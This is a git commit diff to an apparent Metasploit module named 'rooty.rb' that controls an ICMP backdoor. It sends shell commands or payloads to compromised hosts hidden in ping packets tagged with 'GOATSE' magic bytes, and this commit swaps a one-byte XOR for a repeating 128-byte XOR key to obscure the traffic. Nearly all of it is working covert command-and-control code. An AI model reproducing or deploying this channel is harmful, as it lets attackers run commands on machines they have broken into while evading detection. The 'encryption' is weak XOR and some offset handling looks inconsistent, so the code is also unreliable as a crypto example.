1e117b51f2dd272d8205d10a37d0e7820a293128
hal3002 <hal@nutsec.org>
2021-02-15 14:07:37 -0600

    Updating for new encryption scheme

--- msf/rooty.rb
+++ msf/rooty.rb
@@ -5,7 +5,7 @@
 
 require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
   Rank = ManualRanking
 
   include Msf::Exploit::Capture
@@ -35,12 +35,14 @@ class Metasploit3 < Msf::Auxiliary
       'DefaultTarget'  => 0
       ))
 
-      deregister_options('PCAPFILE', 'FILTER', 'SNAPLEN', 'TIMEOUT', 'BLANK_PASSWORDS', 'DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS', 'PASSWORD', 'PASS_FILE', 'USERNAME', 'USERPASS_FILE', 'USER_AS_PASS', 'USER_FILE')
+      deregister_options('PCAPFILE', 'FILTER', 'SNAPLEN', 'TIMEOUT', 'BLANK_PASSWORDS', 'DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS', 'PASSWORD', 'PASS_FILE', 'USERNAME', 'USERPASS_FILE', 'USER_AS_PASS', 'USER_FILE', 'BRUTEFORCE_SPEED')
       register_options(
       [
         OptString.new('SHOST',   [false, 'The source address of the ICMP packet', nil]),
         OptString.new('CMD',     [false, 'The command to execute on the host', nil]),
         OptInt.new('TIMEOUT',     [false, 'How long to wait for responses.', 2]),
+        OptBool.new('BROADCAST',     [false, 'Set if sending to a broadcast address.', false]),
+        OptInt.new('BLOCK_SIZE',     [false, 'Encryption block size.', 128]),
       ], self.class)
   end
 
@@ -49,28 +51,25 @@ class Metasploit3 < Msf::Auxiliary
 
     open_pcap
     pcap = self.capture
-    capture_sendto(build_icmp(ip), ip)
+    capture_sendto(build_icmp(ip), ip, datastore['BROADCAST'])
 
     data = ""
     begin
       Timeout.timeout(datastore['TIMEOUT']) do
         each_packet do |pkt|
           p = PacketFu::Packet.parse(pkt)
+          next unless p.payload.size > 4
+          p.payload = p.payload[4..]
           next unless p.is_icmp?
-	  next unless p.ip_saddr == ip
-    
-          key = (p.payload.each_byte.to_a[0] ^ p.payload.each_byte.to_a[1]) & 0xff
-         
-          decoded = p.payload.each_byte.map {|c| (c^key).chr }.join
+          next unless p.payload.size >= (datastore['BLOCK_SIZE'] * 2)
+          next unless p.payload.size % datastore['BLOCK_SIZE'] == 0
+          decoded = crypt_data(p.payload[128..], p.payload[0..127])
           
-          if decoded[4..10] == "GOATSE\x02"
-            resp = decoded[11..-1].gsub(/\x00.*/, '')
-            next if resp == datastore['CMD']
-
-            data << resp
+          if decoded.start_with?("GOATSE\x00")
+            decoded = decoded[7..]
+            data_len  = decoded[..1].unpack('S<')[0]
+            data << "#{decoded[1..data_len]}\n"
           end
-
-	    
         end
       end
     rescue Timeout::Error
@@ -87,8 +86,31 @@ class Metasploit3 < Msf::Auxiliary
   end
 
 
+  def crypt_data(data, key)
+    block_size = datastore['BLOCK_SIZE']
+
+    if data.size % block_size
+      data += "\x00" * (block_size - (data.size % block_size))
+    end
+
+    j = 0
+
+    0.upto(data.size - 1) do |i|
+      data[i] = (data[i].ord ^ key[j].ord).chr
+
+      if (j > 0) and (j % (block_size - 1) == 0)
+        j = 0
+      else
+        j += 1
+      end
+    end
+
+    return data
+  end
+
   def build_icmp(ip)
     icmp_id = rand(65535) & 0xffff
+    key = (0..127).map { rand(255).chr }.join    
     
     if datastore['CMD'].nil? || datastore['CMD'] == ''
       if datastore['PAYLOAD'].nil? || datastore['PAYLOAD'] == ''
@@ -97,22 +119,15 @@ class Metasploit3 < Msf::Auxiliary
         data = "GOATSE\x01" + payload.encoded
       end
     else
-      data = "GOATSE\x02" + datastore['CMD'] + "\x00"
+      data = "GOATSE\x02" + [datastore['CMD'].size].pack('S<') + datastore['CMD']
     end
  
-
-    if data.size < 18 
-    	data << "\x00" * (data.size % 18)
-    end
-
-    key = (icmp_id & 0xff) ^ ((icmp_id >> 8) & 0xff)
-       
     p = PacketFu::ICMPPacket.new
     p.icmp_type = 8
     p.icmp_code = 0
     p.ip_saddr = datastore['SHOST'] || Rex::Socket.source_address(rhost)
     p.ip_daddr = ip
-    p.payload = capture_icmp_echo_pack(icmp_id, rand(65535) & 0xffff, data.each_byte.map {|c| (c^key).chr }.join)
+    p.payload = capture_icmp_echo_pack(icmp_id, rand(65535) & 0xffff, key + crypt_data(data, key))
     p.recalc
     p.recalc
     return p
